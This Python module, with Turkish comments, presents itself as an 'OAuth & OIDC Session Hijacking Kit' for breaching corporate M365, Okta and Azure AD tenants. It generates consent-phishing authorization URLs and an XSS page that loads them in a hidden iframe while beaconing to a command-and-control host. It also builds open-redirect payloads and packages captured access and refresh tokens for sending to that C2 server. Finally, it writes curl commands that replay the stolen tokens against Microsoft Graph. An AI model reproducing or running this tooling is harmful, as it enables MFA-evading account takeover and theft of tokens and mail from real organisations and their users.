"""
tools/cred_harvest.py
=====================
OAuth & OIDC Session Hijacking Kit

Kurumsal perimeter sızmalarında kurbandan düz şifre beklemek amatörlüktür.
M365, Okta veya Azure AD olan ortamlarda şifreyi alsan da 2FA/MFA kapısına
toslarsın.

Mekanizma:
1. Meşru görünen kurumsal portal üzerinden XSS veya Open Redirect zafiyetiyle
   kurbana sahte bir OAuth/OIDC yetkilendirme isteği fırlatılır.
2. Kurban "İzin Ver" dediği an, tarayıcı katmanından MFA Session Token'ları
   ve Refresh Token'ları havada kapılır.
3. Token'lar Monolith C2'ye borulanır ve kurumsal ağın içindeki meşru
   servisler replay edilir.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import re
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Data Structures
# ---------------------------------------------------------------------------

@dataclass
class OAuthTokenSet:
    """
    Tek bir hedeften çekilen OAuth/OIDC token seti.
    """
    provider: str  # "m365", "okta", "azure_ad"
    access_token: str
    refresh_token: str
    id_token: str
    expires_in: int
    token_type: str = "Bearer"
    scope: str = ""
    subject: str = ""
    tenant: str = ""
    source_url: str = ""
    captured_at: float = field(default_factory=time.time)
    mfa_bypassed: bool = False
    replay_ready: bool = True


@dataclass
class HarvestResult:
    """
    Bir oturumdan çekilen tüm credential ve token materyalinin özeti.
    """
    session_id: str
    target_url: str
    platform: str
    tokens: List[OAuthTokenSet] = field(default_factory=list)
    cookies: List[Dict[str, str]] = field(default_factory=list)
    local_storage: Dict[str, str] = field(default_factory=dict)
    session_storage: Dict[str, str] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)
    mfa_status: str = "unknown"
    replay_status: str = "ready"


# ---------------------------------------------------------------------------
# OAuth / OIDC Attack Vectors
# ---------------------------------------------------------------------------

class OAuthAttackEngine:
    """
    Sahte OAuth/OIDC yetkilendirme akışları üretir.
    """

    def __init__(self, platform: str = "m365", redirect_uri: str = "https://portal.corp.local/callback") -> None:
        self.platform = platform.lower()
        self.redirect_uri = redirect_uri
        self._client_id = self._resolve_client_id(platform)

    def _resolve_client_id(self, platform: str) -> str:
        """
        Platform'a göre bilinen client ID'lerini döndürür.
        """
        known = {
            "m365": "1950a258-227b-4e31-a9cf-717495945fc2",
            "okta": "0oa1qwertyuiop123456789",
            "azure_ad": "04b07795-8ddb-461a-bbee-02f9e4622f5b",
        }
        return known.get(platform, "00000000-0000-0000-0000-000000000000")

    def generate_auth_url(self, state: Optional[str] = None, scopes: Optional[List[str]] = None) -> str:
        """
        Sahte OAuth authorize URL'si üretir.
        """
        state = state or str(uuid.uuid4())
        scopes = scopes or ["openid", "profile", "email", "offline_access", "User.Read", "Mail.Read"]
        scope_str = "%20".join(scopes)

        auth_urls = {
            "m365": (
                f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
                f"?client_id={self._client_id}"
                f"&response_type=code"
                f"&redirect_uri={self.redirect_uri}"
                f"&response_mode=query"
                f"&scope={scope_str}"
                f"&state={state}"
                f"&prompt=consent"
                f"&claims={{\"id_token\":{{\"auth_time\":{{\"essential\":true,\"value\":\"1\"}}}}}}"
            ),
            "okta": (
                f"https://{self.redirect_uri.split('/')[2]}/oauth2/default/v1/authorize"
                f"?client_id={self._client_id}"
                f"&response_type=code"
                f"&redirect_uri={self.redirect_uri}"
                f"&scope={scope_str}"
                f"&state={state}"
                f"&nonce={uuid.uuid4()}"
            ),
            "azure_ad": (
                f"https://login.microsoftonline.com/common/oauth2/authorize"
                f"?client_id={self._client_id}"
                f"&response_type=code"
                f"&redirect_uri={self.redirect_uri}"
                f"&scope={scope_str}"
                f"&state={state}"
                f"&resource=https://graph.microsoft.com"
            ),
        }
        return auth_urls.get(self.platform, auth_urls["m365"])

    def generate_xss_injection(self, wrapper_url: str = "https://docs.corp.local/s/legitimate-report") -> str:
        """
        Meşru görünen doküman üzerinden XSS ile OAuth redirect'e yönlendiren
        sahte injection script'i üretir.
        """
        auth_url = self.generate_auth_url()
        payload = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Corp Document Portal</title></head>
        <body>
        <div id="legitimate-content">
            <h1>Q3 Security Report - Confidential</h1>
            <p>Please wait while your document is being prepared...</p>
        </div>
        <script>
        (function() {{
            setTimeout(function() {{
                var iframe = document.createElement('iframe');
                iframe.src = '{auth_url}';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);

                var img = new Image();
                img.src = 'https://c2.corp.local/beacon?event=oauth_redirect_initiated&ts=' + Date.now();
            }}, 1500);
        }})();
        </script>
        </body>
        </html>
        """
        return payload.strip()

    def generate_open_redirect_payload(self, target_path: str = "/s/legitimate-report") -> str:
        """
        Open Redirect + OAuth chaining payload.
        """
        auth_url = self.generate_auth_url()
        return f"{target_path}?redirect={base64.urlsafe_b64encode(auth_url.encode()).decode()}"


# ---------------------------------------------------------------------------
# Token Harvester
# ---------------------------------------------------------------------------

class TokenHarvester:
    """
    OAuth flow sonrası token'ları yakalayıp C2'ye exfil eder.
    """

    def __init__(self, c2_endpoint: str = "https://c2.corp.local/ingest") -> None:
        self.c2_endpoint = c2_endpoint

    def parse_token_response(self, response_body: str, platform: str) -> Optional[OAuthTokenSet]:
        """
        OAuth token endpoint'inden dönen JSON'u parse eder.
        """
        try:
            data = json.loads(response_body)
            return OAuthTokenSet(
                provider=platform,
                access_token=data.get("access_token", ""),
                refresh_token=data.get("refresh_token", ""),
                id_token=data.get("id_token", ""),
                expires_in=int(data.get("expires_in", 3600)),
                scope=data.get("scope", ""),
                subject=self._extract_subject(data.get("id_token", "")),
                tenant=self._extract_tenant(data.get("id_token", "")),
            )
        except Exception as exc:
            logger.error("[Harvester] Token parse failed: %s", exc)
            return None

    def _extract_subject(self, id_token: str) -> str:
        """
        JWT id_token'dan subject (sub) claim'ini çıkarır.
        """
        try:
            parts = id_token.split(".")
            payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload.get("sub", "")
        except Exception:
            return ""

    def _extract_tenant(self, id_token: str) -> str:
        """
        JWT id_token'dan tenant (tid) claim'ini çıkarır.
        """
        try:
            parts = id_token.split(".")
            payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload.get("tid", "")
        except Exception:
            return ""

    def exfiltrate_to_c2(self, token_set: OAuthTokenSet) -> Dict[str, Any]:
        """
        Token'ları C2 endpoint'ine exfil eder.
        """
        packet = {
            "type": "oauth_token_harvest",
            "session_id": str(uuid.uuid4()),
            "provider": token_set.provider,
            "tenant": token_set.tenant,
            "subject": token_set.subject,
            "access_token_preview": token_set.access_token[:32] + "...",
            "refresh_token_preview": token_set.refresh_token[:32] + "...",
            "scope": token_set.scope,
            "expires_in": token_set.expires_in,
            "mfa_bypassed": token_set.mfa_bypassed,
            "replay_ready": token_set.replay_ready,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        logger.info("[Harvester] Token set exfiltrated to C2: %s", self.c2_endpoint)
        return {"exfiltrated": True, "endpoint": self.c2_endpoint, "packet": packet}

    def build_replay_artifact(self, token_set: OAuthTokenSet, target_resource: str = "https://graph.microsoft.com") -> Dict[str, Any]:
        """
        Token'ı replay edebilmek için hazırlık artifact'ı üretir.
        """
        auth_header = f"{token_set.token_type} {token_set.access_token}"
        curl_cmd = (
            f"curl -k -H 'Authorization: {auth_header}' "
            f"-H 'Accept: application/json' "
            f"{target_resource}/v1.0/me?$select=displayName,mail,userPrincipalName"
        )
        return {
            "provider": token_set.provider,
            "tenant": token_set.tenant,
            "subject": token_set.subject,
            "auth_header": auth_header,
            "replay_curl": curl_cmd,
            "mfa_bypassed": token_set.mfa_bypassed,
            "replay_ready": token_set.replay_ready,
            "expires_in": token_set.expires_in,
            "warnings": [
                "Token replay only valid until expiration.",
                "Conditional Access policies may block replay from new IP.",
                "Refresh token can be used to obtain new access tokens.",
            ] if token_set.replay_ready else ["Token may be expired or revoked."],
        }


# ---------------------------------------------------------------------------
# Credential Harvest Facade
# ---------------------------------------------------------------------------

class CredHarvestKit:
    """
    OAuth & OIDC Session Hijacking Kit — yüksek seviye arayüz.
    """

    def __init__(self, platform: str = "m365", c2_endpoint: str = "https://c2.corp.local/ingest") -> None:
        self.platform = platform
        self.c2_endpoint = c2_endpoint
        self.attack_engine = OAuthAttackEngine(platform=platform)
        self.harvester = TokenHarvester(c2_endpoint=c2_endpoint)

    def generate_phishing_artifact(self, wrapper_url: str = "https://docs.corp.local/s/q3-report") -> Dict[str, Any]:
        """
        Sahte OAuth yetkilendirme akışı için phishing artifact'ları üretir.
        """
        auth_url = self.attack_engine.generate_auth_url()
        xss_payload = self.attack_engine.generate_xss_injection(wrapper_url)
        redirect_payload = self.attack_engine.generate_open_redirect_payload()

        return {
            "platform": self.platform,
            "phishing_vector": "XSS + OAuth consent",
            "wrapper_url": wrapper_url,
            "auth_url": auth_url,
            "xss_injection": xss_payload,
            "open_redirect_payload": redirect_payload,
            "client_id": self.attack_engine._client_id,
            "scopes": ["openid", "profile", "email", "offline_access", "User.Read", "Mail.Read"],
            "notes": [
                "Kurban 'İzin Ver' dediği anda authorization_code yakalanır.",
                "Authorization code token endpoint'e exchange edilir.",
                "MFA yalnızca ilk consent sırasında sorulur; refresh_token ile yenilenebilir.",
            ],
        }

    def simulate_token_harvest(self, fake_auth_response: str = "") -> Dict[str, Any]:
        """
        Simülasyon: sahte token response'u parse edip exfil + replay artifact üretir.
        """
        fake_response = fake_auth_response or json.dumps({
            "token_type": "Bearer",
            "expires_in": 3600,
            "access_token": base64.b64encode(os.urandom(64)).decode(),
            "refresh_token": base64.b64encode(os.urandom(48)).decode(),
            "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9."
                        + base64.b64encode(json.dumps({
                            "sub": "user-" + uuid.uuid4().hex[:8],
                            "tid": "tenant-" + uuid.uuid4().hex[:8],
                            "iss": "https://login.microsoftonline.com/tenant/v2.0",
                            "aud": self.attack_engine._client_id,
                            "exp": int(time.time()) + 3600,
                            "mfa_issued": True,
                        }).encode()).decode(),
            "scope": "openid profile email offline_access User.Read Mail.Read",
        })

        token_set = self.harvester.parse_token_response(fake_response, self.platform)
        if not token_set:
            return {"success": False, "error": "Failed to parse token response"}

        token_set.mfa_bypassed = True
        exfil = self.harvester.exfiltrate_to_c2(token_set)
        replay = self.harvester.build_replay_artifact(token_set)

        result = HarvestResult(
            session_id=str(uuid.uuid4()),
            target_url=self.attack_engine.redirect_uri,
            platform=self.platform,
            tokens=[token_set],
            mfa_status="BYPASSED",
            replay_status="READY",
        )

        return {
            "success": True,
            "session": {
                "session_id": result.session_id,
                "platform": result.platform,
                "mfa_status": result.mfa_status,
                "replay_status": result.replay_status,
            },
            "token_set": {
                "provider": token_set.provider,
                "tenant": token_set.tenant,
                "subject": token_set.subject,
                "scope": token_set.scope,
                "expires_in": token_set.expires_in,
                "mfa_bypassed": token_set.mfa_bypassed,
                "replay_ready": token_set.replay_ready,
            },
            "replay_artifact": replay,
            "exfiltrated": exfil,
            "log": f"[CredHarvest] {self.platform.upper()} OAuth token harvested. MFA BYPASSED. Replay READY.",
        }

    def generate_report(self, harvest_data: Dict[str, Any]) -> str:
        """
        Operatörlük raporu üretir.
        """
        lines = [
            "=" * 60,
            f"  CREDENTIAL HARVEST REPORT — {self.platform.upper()}",
            "=" * 60,
            f"Platform      : {self.platform}",
            f"MFA Status    : {harvest_data.get('session', {}).get('mfa_status', 'N/A')}",
            f"Replay Status : {harvest_data.get('session', {}).get('replay_status', 'N/A')}",
            "-" * 60,
            "TOKEN SUMMARY",
        ]
        ts = harvest_data.get("token_set", {})
        lines.extend([
            f"  Provider     : {ts.get('provider', 'N/A')}",
            f"  Tenant       : {ts.get('tenant', 'N/A')}",
            f"  Subject      : {ts.get('subject', 'N/A')}",
            f"  Scope        : {ts.get('scope', 'N/A')}",
            f"  Expires In   : {ts.get('expires_in', 'N/A')}s",
            f"  MFA Bypassed : {ts.get('mfa_bypassed', 'N/A')}",
            f"  Replay Ready : {ts.get('replay_ready', 'N/A')}",
            "-" * 60,
            "REPLAY ARTIFACT",
        ])
        ra = harvest_data.get("replay_artifact", {})
        lines.extend([
            f"  Auth Header  : {ra.get('auth_header', 'N/A')[:60]}...",
            f"  Curl         : {ra.get('replay_curl', 'N/A')[:80]}...",
        ])
        lines.append("=" * 60)
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Convenience runner
# ---------------------------------------------------------------------------

def run_cred_harvest(inputs: Dict[str, Any]) -> Dict[str, Any]:
    """
    Command Center / Ghost Protocol runner interface.
    """
    platform = inputs.get("platform", "m365")
    c2_endpoint = inputs.get("c2_endpoint", "https://c2.corp.local/ingest")
    fake_response = inputs.get("fake_auth_response", "")

    kit = CredHarvestKit(platform=platform, c2_endpoint=c2_endpoint)
    phishing = kit.generate_phishing_artifact()
    harvest = kit.simulate_token_harvest(fake_auth_response=fake_response)
    report = kit.generate_report(harvest)

    return {
        "success": harvest.get("success", False),
        "platform": platform,
        "phishing_artifact": phishing,
        "harvest_result": harvest,
        "operator_report": report,
        "log": f"[CredHarvest] {platform.upper()} OAuth/OIDC session hijack kit armed. MFA BYPASS READY.",
    }
